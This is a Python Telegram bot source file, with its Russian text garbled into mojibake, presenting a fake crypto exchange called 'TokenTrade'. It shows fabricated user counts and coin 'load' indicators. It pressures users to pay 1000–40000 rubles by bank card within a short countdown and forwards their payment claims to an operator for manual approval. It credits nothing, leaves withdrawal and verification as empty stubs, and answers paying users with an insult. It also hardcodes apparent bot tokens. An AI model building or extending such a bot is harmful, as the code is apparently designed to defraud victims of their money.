from aiogram import Bot, Dispatcher, executor, types
import aiohttp
from aiogram import types
from aiogram.types import InputFile, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
import random
import datetime
import asyncio
import requests
import sqlite3

db = sqlite3.connect('firstmydb.dp')

c = db.cursor()

# c.execute("""
# CREATE TABLE articles (
#     title TEXT,
#     full_text TEXT,
#     views INTEGER,
#     avtor TEXT
# )
# """)

# c.execute("INSERT INTO articles VALUES ('Google is cool!', 'google is realy cool', 100, 'Admin')")

c.execute("SELECT * FROM articles")
# print(c.fetchall())
# print(c.fetchmany(1))
print(c.fetchone())

db.commit()
db.close()

NOTIFICATION_BOT_TOKEN = '7171971708:AAEA8y72nVbKoVCP5W0MhnAHp8TixIJF7Fc'
NOTIFICATION_BOT_CHAT_ID = '722015899'
bot = Bot('6384742400:AAGubm_Wh_QG_7eHntNl2fQ00vNWnO31Qr4')
dp = Dispatcher(bot)
timer_active = False

# –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã—Ö –º–æ–Ω–µ—Ç –∏ –∏—Ö —Ü–≤–µ—Ç–æ–≤
altcoins = [
    {"name:": "Notcoin", "color": "üî¥"},
    {"name:": "Toncoin", "color": "üü¢"},
    {"name:": "Solana", "color": "üü°"}
]

async def send_my_cabinet(message: types.Message):
    # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ —á–∏—Å–ª–∞ –≤ –¥–∏–∞–ø–∞–∑–æ–Ω–µ –æ—Ç 1100 –¥–æ 1200
    online_count = random.randint(1100, 1200)
    
    user_id = message.from_user.id

    # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ —Ü–≤–µ—Ç–∞ –¥–ª—è Bitcoin –∏ Ethereum
    bitcoin_load = get_random_load_color()
    ethereum_load = get_random_load_color()
    
    # –ò–∑–≤–ª–µ–∫–∞–µ–º –º–æ–Ω–µ—Ç—É –∏ –µ—ë —Ü–≤–µ—Ç –∏–∑ —Å–ø–∏—Å–∫–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã—Ö –º–æ–Ω–µ—Ç
    altcoin = altcoins.pop(0)
    altcoin_load = altcoin["name:"] + ": " + altcoin["color"]
    # –ü–æ–º–µ—â–∞–µ–º –∏–∑–≤–ª–µ—á–µ–Ω–Ω—É—é –º–æ–Ω–µ—Ç—É –≤ –∫–æ–Ω–µ—Ü —Å–ø–∏—Å–∫–∞, —á—Ç–æ–±—ã –æ–Ω–∞ —Å—Ç–∞–ª–∞ –ø–æ—Å–ª–µ–¥–Ω–µ–π –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º –≤—ã–∑–æ–≤–µ
    altcoins.append(altcoin)

    # –°–æ–∑–¥–∞–µ–º –∏–Ω–ª–∞–π–Ω –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    keyboard = InlineKeyboardMarkup(row_width=2)  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–Ω–æ–ø–æ–∫ –≤ —Å—Ç—Ä–æ–∫–µ (–≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ - 2)
    # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫–∏
    keyboard.add(
        InlineKeyboardButton("üí≥–ü–æ–ø–æ–ª–Ω–∏—Ç—å", callback_data='top_up'),
        InlineKeyboardButton("üí∞–í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤", callback_data='withdraw'),
        InlineKeyboardButton("üõ°Ô∏è–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è", callback_data='verification'),
        InlineKeyboardButton("‚öôÔ∏è–ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data='settings')
    )
        
    my_cabinet_message = f"""
üîê –õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üõ°Ô∏è –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚ùå
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üè¶ –û–±—â–∏–π –±–∞–ª–∞–Ω—Å: 0 ‚ÇΩ
üÜî ID: {user_id} 
üìä –í—Å–µ–≥–æ —Å–¥–µ–ª–æ–∫: 0
‚úÖ –£–¥–∞—á–Ω—ã—Ö: 0
‚ùå –ù–µ—É–¥–∞—á–Ω—ã—Ö: 0
üí∞ –í—ã–≤–æ–¥–æ–≤ —Å–æ–≤–µ—Ä—à–µ–Ω–æ 0 –Ω–∞ —Å—É–º–º—É 0 ‚ÇΩ
üõ°Ô∏è –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: ‚ùå
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –æ–Ω–ª–∞–π–Ω: {online_count}

–ó–∞–≥—Ä—É–∂–µ–Ω–Ω–æ—Å—Ç—å Bitcoin: {bitcoin_load}
–ó–∞–≥—Ä—É–∂–µ–Ω–Ω–æ—Å—Ç—å Ethereum: {ethereum_load}
–ó–∞–≥—Ä—É–∂–µ–Ω–Ω–æ—Å—Ç—å {altcoin_load}
"""
    
    photo_url = 'https://ibb.co/8dxBz4M'  # –ó–∞–º–µ–Ω–∏ URL –Ω–∞ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_cabinet_message,
        reply_markup=keyboard  # –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω–ª–∞–π–Ω –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
    )

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–±–æ—Ä–∞ —Å–ª—É—á–∞–π–Ω–æ–≥–æ —Ü–≤–µ—Ç–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ—Å—Ç–∏
def get_random_load_color():
    return random.choice(["üü°", "üü¢", "üî¥"])

async def send_top_up_options(call: types.CallbackQuery):
    top_up_keyboard = InlineKeyboardMarkup(row_width=1)
    top_up_keyboard.add(
        InlineKeyboardButton("üí≥–ü–æ–ø–æ–ª–Ω–∏—Ç—å —á–µ—Ä–µ–∑ –±–∞–Ω–∫–æ–≤—Å–∫—É—é –∫–∞—Ä—Ç—É", callback_data='top_up_card'),
        InlineKeyboardButton("üí±–ü–æ–ø–æ–ª–Ω–∏—Ç—å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–æ–π", callback_data='top_up_crypto')
    )
    
    await call.message.edit_caption(
        caption="–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞:",
        reply_markup=top_up_keyboard
    )

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–∞–∂–∞—Ç–∏–π –Ω–∞ –∫–Ω–æ–ø–∫–∏
@dp.callback_query_handler(lambda call: call.data == 'top_up_crypto')
async def process_crypto_top_up(call: types.CallbackQuery):
    crypto_keyboard = InlineKeyboardMarkup(row_width=1)
    crypto_keyboard.add(
        InlineKeyboardButton("–ö–Ω–æ–ø–∫–∞ 1", callback_data='button1'),
        InlineKeyboardButton("–ö–Ω–æ–ø–∫–∞ 2", callback_data='button2'),
        InlineKeyboardButton("–ö–Ω–æ–ø–∫–∞ 3", callback_data='button3')
    )
    
    await call.message.edit_caption(
        caption="–ü—Ä–∏–≤–µ—Ç",
        reply_markup=crypto_keyboard
    )

# –ü—Ä–∏–º–µ—Ä —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∏ –≤—ã–∑–æ–≤–∞ send_top_up_options
@dp.callback_query_handler(lambda call: call.data == 'start_top_up')
async def start_top_up(call: types.CallbackQuery):
    await send_top_up_options(call)

@dp.callback_query_handler(lambda call: call.data == 'top_up')
async def process_top_up(call: types.CallbackQuery):
    await send_top_up_options(call)

async def send_bank_options(call: types.CallbackQuery):
    bank_keyboard = InlineKeyboardMarkup(row_width=1)
    bank_keyboard.add(
        InlineKeyboardButton("–°–±–µ—Ä–ë–∞–Ω–∫", callback_data='sberbank'),
        InlineKeyboardButton("–¢–∏–Ω—å–∫–æ—Ñ—Ñ", callback_data='tinkoff')
    )
    
    await call.message.edit_caption(
        caption="–í—ã–±–µ—Ä–∏—Ç–µ –±–∞–Ω–∫ –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:",
        reply_markup=bank_keyboard
    )
async def process_bank_selection(call: types.CallbackQuery, bank_name: str):
    await call.message.answer(
        text="–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:\n\n–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞: 1000 —Ä—É–±–ª–µ–π")
    # –î–æ–±–∞–≤—å—Ç–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ –±–∞–Ω–∫–∞ –∏ –ø–µ—Ä–µ—Ö–æ–¥ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —à–∞–≥—É (–æ–∂–∏–¥–∞–Ω–∏–µ –≤–≤–æ–¥–∞ —Å—É–º–º—ã –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è)

async def start_timer(finish_time, chat_id):
    while datetime.datetime.now() < finish_time:
        await asyncio.sleep(60)
    # –ï—Å–ª–∏ –≤—Ä–µ–º—è –∏—Å—Ç–µ–∫–ª–æ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
    await bot.send_message(chat_id, "–ü–æ–∑–¥–Ω–æ, –¥—Ä—É–∂–∏—â–µ! –í—Ä–µ–º—è –¥–ª—è –æ–ø–ª–∞—Ç—ã –∏—Å—Ç–µ–∫–ª–æ.")
    # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Ñ–ª–∞–≥ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ —Ç–∞–π–º–µ—Ä–∞
    global timer_active
    timer_active = False

@dp.message_handler(lambda message: message.text.isdigit())
async def process_top_up_amount(message: types.Message):
    global timer_active, top_up_amount
    
    try:
        number = float(message.text)
        if number < 1000:
            await message.answer("‚ùå")
            await message.answer("–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: 1000 —Ä—É–±–ª–µ–π.")
        elif number > 40000:
            await message.answer("‚ùå")
            await message.answer("–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è: 40000 —Ä—É–±–ª–µ–π.")
        else:
            top_up_amount = number  # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ —Å—É–º–º—ã –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è
            finish_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
            formatted_time = finish_time.strftime("%H:%M")
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            keyboard.add(
                types.InlineKeyboardButton(text="‚úÖ–ü–æ–ø–æ–ª–Ω–∏–ª(–∞)", callback_data="confirmed"),
                types.InlineKeyboardButton(text="‚ùå–û—Ç–º–µ–Ω–∏—Ç—å", callback_data="back")
            )
            await message.answer(
                text=f"‚ôªÔ∏è –û–ø–ª–∞—Ç–∞ –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π:\n\n"
                     f"–°—É–º–º–∞: {number} ‚ÇΩ\n\n"
                     f"–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –æ–ø–ª–∞—Ç—ã –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π:\n"
                     f"‚îî0000-0000-0000-0000\n\n"
                     f"–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –æ–ø–ª–∞—Ç—ã —á–µ—Ä–µ–∑ –°–ë–ü (–ú–¢–° BANK):\n"
                     f"‚îî0000-0000-0000-0000\n\n"
                     f"‚ÄºÔ∏è–û–ø–ª–∞—Ç–∏—Ç–µ —Ç–æ—á–Ω—É—é —Å—É–º–º—É —É–∫–∞–∑–∞–Ω–Ω—É—é –≤ —Å—Ç—Ä–æ–∫–µ ¬´–°—É–º–º–∞¬ª –ø–æ —É–∫–∞–∑–∞–Ω–Ω—ã–º —Ä–µ–∫–≤–∏–∑–∏—Ç–∞–º.\n"
                     f"–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –±–∞–ª–∞–Ω—Å –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω –Ω–∞ –í–∞—à –∞–∫–∫–∞—É–Ω—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –≤ —Ç–µ—á–µ–Ω–∏–∏ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –º–∏–Ω—É—Ç.\n\n"
                     f"–£ –í–∞—Å –æ—Å—Ç–∞–ª–æ—Å—å –¥–æ {formatted_time} –¥–ª—è –æ–ø–ª–∞—Ç—ã",
                reply_markup=keyboard
            )
            if not timer_active:
                timer_active = True
                await start_timer(finish_time, message.chat.id)
    except ValueError:
        await message.answer("–í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —Å—É–º–º—ã –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è.")

async def process_top_up(message: types.Message):
    user_id = message.from_user.id
    
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º –≥–ª–æ–±–∞–ª—å–Ω—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é —Å —Å—É–º–º–æ–π –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è
    amount = top_up_amount  
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤–æ –≤—Ç–æ—Ä–æ–π –±–æ—Ç
    notification_message = f"–ö –≤–∞–º –Ω–æ–≤—ã–π –∫–ª–∏–µ–Ω—Ç @{message.from_user.username} –ø–æ–ø–æ–ª–Ω—è–µ—Ç –±–∞–ª–∞–Ω—Å –Ω–∞ {amount} —Ä—É–±–ª–µ–π."
    notify_payload = {
        'chat_id': NOTIFICATION_BOT_CHAT_ID,
        'text': notification_message,
        'reply_markup': {
            'inline_keyboard': [
                [
                    {'text': '–û–¥–æ–±—Ä–∏—Ç—å', 'callback_data': f'approve_{user_id}_{amount}'}
                ]
            ]
        }
    }
    requests.post(f'https://api.telegram.org/bot{NOTIFICATION_BOT_TOKEN}/sendMessage', json=notify_payload)

    await message.answer(f"–ü–û–®–ï–õ –ù–ê–•–£–ô!")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–∫–∏ "–û–¥–æ–±—Ä–∏—Ç—å"
@dp.callback_query_handler(lambda query: query.data.startswith('approve'))
async def approve_top_up(callback_query: types.CallbackQuery):
    _, user_id, amount = callback_query.data.split('_')
    user_id = int(user_id)
    amount = float(amount)
    
    # –í—ã–ø–æ–ª–Ω–∏—Ç–µ –∑–¥–µ—Å—å –ª–æ–≥–∏–∫—É –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è —Å—Ä–µ–¥—Å—Ç–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —Å user_id –≤ —Ä–∞–∑–º–µ—Ä–µ amount
    # –ù–∞–ø—Ä–∏–º–µ—Ä, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ —Å—Ä–µ–¥—Å—Ç–≤ —á–µ—Ä–µ–∑ –≤–∞—à –ø–µ—Ä–≤—ã–π –±–æ—Ç
    
    # –ó–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ª–æ–≥–∏–∫–∞ –Ω–∞—á–∏—Å–ª–µ–Ω–∏—è —Å—Ä–µ–¥—Å—Ç–≤
    await callback_query.answer("–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –æ–¥–æ–±—Ä–µ–Ω–æ.")

@dp.callback_query_handler(lambda call: call.data == 'confirmed')
async def start_command_start(message: types.Message):
    await process_top_up(message)

# @dp.callback_query_handler(lambda call: call.data == 'confirmed') 
# async def confirmed_new(call: types.CallbackQuery):
#     await call.message.answer(
#         text="""
# ‚úÖ –ü–æ—Å–ª–µ –∑–∞—á–∏—Å–ª–µ–Ω–∏—è –ø–ª–∞—Ç–µ–∂–∞ - –í–∞—à —Å—á—ë—Ç –±—É–¥–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ø–æ–ª–Ω–µ–Ω!
# –ï—Å–ª–∏ —ç—Ç–æ–≥–æ –Ω–µ –ø—Ä–æ–∏–∑–æ—à–ª–æ –≤ —Ç–µ—á–µ–Ω–∏–∏ 10 –º–∏–Ω—É—Ç –ø–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã, —Å–≤—è–∂–∏—Ç–µ—Å—å —Å –¢–µ—Ö.–ü–æ–¥–¥–µ—Ä–∂–∫–æ–π.
# """)

@dp.callback_query_handler(lambda call: call.data == 'back') 
async def back_new(call: types.CallbackQuery):
    await send_my_cabinet(call.message)  # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º —Å—Ç–∞—Ä—Ç–æ–≤—É—é —Ñ—É–Ω–∫—Ü–∏—é

@dp.callback_query_handler(lambda call: call.data == 'sberbank')
async def process_sberbank_selection(call: types.CallbackQuery):
    await process_bank_selection(call, "–°–±–µ—Ä–±–∞–Ω–∫")

@dp.callback_query_handler(lambda call: call.data == 'tinkoff')
async def process_tinkoff_selection(call: types.CallbackQuery):
    await process_bank_selection(call, "–¢–∏–Ω—å–∫–æ—Ñ—Ñ")

@dp.callback_query_handler(lambda call: call.data == 'top_up_card')
async def process_top_up_card(call: types.CallbackQuery):
    await send_bank_options(call)

@dp.callback_query_handler(lambda call: call.data == 'withdraw')
async def process_withdraw(call: types.CallbackQuery):
    await call.message.answer("""üí∞–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤—ã–≤–æ–¥–∞:
                              
–£ –≤–∞—Å –Ω–∞ –±–∞–ª–∞–Ω—Å–µ: 0 ‚ÇΩ
–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: 1000 ‚ÇΩ""")

@dp.callback_query_handler(lambda call: call.data == 'verification')
async def process_verification(call: types.CallbackQuery):
    await call.message.answer("–ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è –ø–æ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏...")

@dp.callback_query_handler(lambda call: call.data == 'settings')
async def process_settings(call: types.CallbackQuery):
    await call.message.answer("–ù–∞—Å—Ç—Ä–æ–π–∫–∏...")

async def send_my_future(message: types.Message):
    my_future_message = "–ú–æ–∏ —Ñ–∏—á—é—Ä–∏"
    photo_url = 'https://ibb.co.com/5X0NCQK'  # –ó–∞–º–µ–Ω–∏ URL –Ω–∞ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_future_message,
    )
async def send_my_birje(message: types.Message):
    my_birje_message = "–ú–æ—è –±–∏—Ä–∂–∞"
    photo_url = 'https://ibb.co.com/7Y1ZDqj'  # –ó–∞–º–µ–Ω–∏ URL –Ω–∞ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_birje_message,
    )
async def send_my_us(message: types.Message):
    my_us_message = "–ú—ã –≤—Å–µ–≥–¥–∞ —Ä–∞–¥—ã –Ω–æ–≤—ã–º –ª—é–¥—è–º, –ø—Ä–∏–≥–ª–∞—à–∞–π—Ç–µ –¥—Ä—É–∑–µ–π –∏ –∑–∞—Ä–∞"
    photo_url = 'https://ibb.co.com/rvnSbnL'  # –ó–∞–º–µ–Ω–∏ URL –Ω–∞ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=my_us_message,
    )
async def send_my_support(message: types.Message):
    support_username = "akapovich001"
    support_link = f"https://t.me/{support_username}"

    # –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã —Å –ª–∏–Ω–µ–π–Ω–æ–π –∫–Ω–æ–ø–∫–æ–π
    support_keyboard = InlineKeyboardMarkup(row_width=1)
    support_keyboard.add(
        InlineKeyboardButton("–ù–∞–ø–∏—Å–∞—Ç—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É", url=support_link)
    )
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–Ω–æ–ø–∫–æ–π
    await message.answer(
        f"–î–ª—è —Å–≤—è–∑–∏ —Å –ø–æ–¥–¥–µ—Ä–∂–∫–æ–π –ø–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ: –Ω–∞–ø–∏—Å–∞—Ç—å –≤ –ø–æ–¥–¥–µ—Ä–∂–∫—É",
        parse_mode=types.ParseMode.HTML,
        reply_markup=support_keyboard
    )


async def send_photo_with_text(photo_url: str, text: str, message: types.Message):
    async with aiohttp.ClientSession() as session:
        async with session.get(photo_url) as resp:
            if resp.status != 200:
                return await message.answer("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ.")
            data = await resp.read()
            await bot.send_photo(message.chat.id, data, caption=text)

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(
        types.KeyboardButton(text="üíº –ú–æ–π –∫–∞–±–∏–Ω–µ—Ç"),
        types.KeyboardButton(text="üìä –§—å—é—á–µ—Ä—Å—ã"),
        types.KeyboardButton(text="üìà –ë–∏—Ä–∂–∞"),
        types.KeyboardButton(text="üì∞ –ú—ã"),
        types.KeyboardButton(text="üë®üèª‚Äçüíª –¢–µ—Ö.–ü–æ–¥–¥–µ—Ä–∂–∫–∞")
    )
    
    welcome_message = """
üìä –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –Ω–∞ –∫—Ä–∏–ø—Ç–æ-–±–∏—Ä–∂—É TokenTrade!

üìä –ú—ã —Ä–∞–¥—ã –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –í–∞—Å –Ω–∞ –Ω–∞—à–µ–π –ø–ª–∞—Ç—Ñ–æ—Ä–º–µ, –≥–¥–µ –í—ã –º–æ–∂–µ—Ç–µ —Ç–æ—Ä–≥–æ–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–º–∏ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–∞–º–∏ –∏ –ø–æ–ª—É—á–∞—Ç—å –ø—Ä–∏–±—ã–ª—å –æ—Ç –∏–∑–º–µ–Ω–µ–Ω–∏—è –∏—Ö –∫—É—Ä—Å–æ–≤. TokenTrade –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —É–¥–æ–±–Ω—ã–π –∏ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π —Å–ø–æ—Å–æ–± –ø–æ–∫—É–ø–∫–∏, –ø—Ä–æ–¥–∞–∂–∏ –∏ –æ–±–º–µ–Ω–∞ —Å–∞–º—ã—Ö —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç, –∞ —Ç–∞–∫–∂–µ –º–Ω–æ–∂–µ—Å—Ç–≤–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –∏ –ø—Ä–∏–Ω—è—Ç–∏—è —Ä–µ—à–µ–Ω–∏–π –Ω–∞ –æ—Å–Ω–æ–≤–µ –¥–∞–Ω–Ω—ã—Ö.

üìà –ù–∞—à–∞ –∫–æ–º–∞–Ω–¥–∞ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞–¥ —É–ª—É—á—à–µ–Ω–∏–µ–º –Ω–∞—à–µ–π –ø–ª–∞—Ç—Ñ–æ—Ä–º—ã, —á—Ç–æ–±—ã –æ–±–µ—Å–ø–µ—á–∏—Ç—å –Ω–∞—à–∏–º –∫–ª–∏–µ–Ω—Ç–∞–º –ª—É—á—à–∏–π –æ–ø—ã—Ç —Ç–æ—Ä–≥–æ–≤–ª–∏ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç–∞–º–∏. –ú—ã —Ç–∞–∫–∂–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ–º –ø–æ–ª–Ω—É—é –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –í–∞—à–∏—Ö —Å—Ä–µ–¥—Å—Ç–≤.

üë®üèª‚Äçüíª _–ï—Å–ª–∏ —É –í–∞—Å –≤–æ–∑–Ω–∏–∫–Ω—É—Ç –≤–æ–ø—Ä–æ—Å—ã –∏–ª–∏ –∑–∞—Ç—Ä—É–¥–Ω–µ–Ω–∏—è, –Ω–∞—à–∞ —Å–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –≤—Å–µ–≥–¥–∞ –≥–æ—Ç–æ–≤–∞ –ø–æ–º–æ—á—å –í–∞–º_.
    """
    
    photo_url = 'https://ibb.co.com/nwhdMJ9'  # –ó–∞–º–µ–Ω–∏ URL –Ω–∞ –ø—Ä—è–º—É—é —Å—Å—ã–ª–∫—É –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ
    
    await bot.send_photo(
        chat_id=message.chat.id,
        photo=photo_url,
        caption=welcome_message,
        parse_mode=types.ParseMode.MARKDOWN,
        reply_markup=keyboard
    )

# –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –∫–Ω–æ–ø–æ–∫
dp.register_message_handler(send_my_cabinet, lambda message: message.text == "üíº –ú–æ–π –∫–∞–±–∏–Ω–µ—Ç")
dp.register_message_handler(send_my_future, lambda message: message.text == "üìä –§—å—é—á–µ—Ä—Å—ã")
dp.register_message_handler(send_my_birje, lambda message: message.text == "üìà –ë–∏—Ä–∂–∞")
dp.register_message_handler(send_my_us, lambda message: message.text == "üì∞ –ú—ã")
dp.register_message_handler(send_my_support, lambda message: message.text == "üë®üèª‚Äçüíª –¢–µ—Ö.–ü–æ–¥–¥–µ—Ä–∂–∫–∞")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)